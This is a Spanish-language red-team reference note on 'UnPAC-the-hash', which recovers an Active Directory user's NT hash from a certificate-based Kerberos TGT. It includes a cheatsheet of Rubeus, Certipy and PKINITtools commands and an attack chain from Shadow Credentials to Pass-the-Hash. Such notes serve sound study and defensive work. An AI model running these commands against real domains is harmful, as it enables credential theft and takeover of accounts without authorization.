---
aliases:
  - UnPAC-the-hash
  - UnPAC the Hash
  - PKINIT NT Hash Recovery
tags:
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - env/windows
  - cred/ntlm
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Shadow Credentials]]"
  - "[[AD CS Abuse]]"
  - "[[Pass-the-Hash]]"
  - "[[Overpass-the-Hash]]"
---
# UnPAC-the-hash

Técnica que **recupera el NT hash de un usuario a partir de su autenticación con certificado (PKINIT)**. Cuando te autenticás con un certificado (Shadow Credentials, AD CS, smartcard), el KDC devuelve en el TGT un buffer `PAC_CREDENTIAL_INFO` cifrado que **contiene el NT hash** del usuario — pensado para que servicios NTLM funcionen tras un login con cert. Pedirlo y descifrarlo = obtener el hash sin tocar LSASS.

Es el puente entre **acceso por certificado** (que no da hash directamente) y **NTLM** (PtH, reuse). Complementa [[Shadow Credentials]] y [[AD CS Abuse]].

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Rubeus.exe asktgt /user:U /certificate:cert.pfx /password:P /getcredentials /show` | TGT + **NT hash** del usuario desde el PAC | Tenés un cert/PFX del usuario. |
| `certipy auth -pfx user.pfx -dc-ip $IP` | Autentica con el cert y devuelve el **NT hash** (UnPAC automático) | Workflow Certipy (Linux). |
| `gettgtpkinit.py -cert-pfx user.pfx corp.local/user user.ccache` (PKINITtools) | TGT vía PKINIT | Paso 1 manual. |
| `getnthash.py -key <AS-REP-key> corp.local/user` (PKINITtools) | Extrae el NT hash del PAC del TGT | Paso 2 manual. |

```bash
# Flujo Certipy (lo más usado): de Shadow Credentials a NT hash
certipy shadow auto -u U@corp.local -p P -account victim   # añade KeyCredentialLink y autentica
# → devuelve directamente: "Got hash for 'victim@corp.local': aad3b...:NTHASH"

# O con un PFX ya obtenido (ESC1, smartcard, etc.)
certipy auth -pfx victim.pfx -dc-ip 10.10.10.10
# → TGT + NT hash → usar con Pass-the-Hash
```

---

## Overview

PKINIT (Kerberos con criptografía de clave pública) permite autenticarte con un certificado en vez de password. Para que el usuario pueda seguir usando servicios **NTLM** después, Microsoft mete el NT hash dentro del PAC del TGT (`PAC_CREDENTIAL_INFO`). UnPAC-the-hash simplemente **pide ese TGT y lee el hash** — descifrándolo con la clave de sesión AS-REP.

**Por qué importa:** muchas rutas de ataque modernas dan un **certificado**, no un hash:
- [[Shadow Credentials]] (escribís `msDS-KeyCredentialLink` y autenticás con cert).
- [[AD CS Abuse]] (ESC1/ESC8 → cert de cualquier usuario).
- Robo de certificado de smartcard/PFX.

Con UnPAC-the-hash convertís ese cert en el **NT hash persistente** → [[Pass-the-Hash]], reuse offline, crack. El hash no rota como el cert.

> [!tip] Combo canónico
> Shadow Credentials → UnPAC-the-hash → Pass-the-Hash. Funciona contra cualquier cuenta sobre la que tengas `GenericWrite`/`GenericAll`, sin conocer su password.

---

## Recursos

- [The Hacker Recipes — UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) — detalle del PAC_CREDENTIAL_INFO.
- [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools) — `gettgtpkinit.py` + `getnthash.py`.
- [ly4k/Certipy](https://github.com/ly4k/Certipy) — `auth` / `shadow auto`.
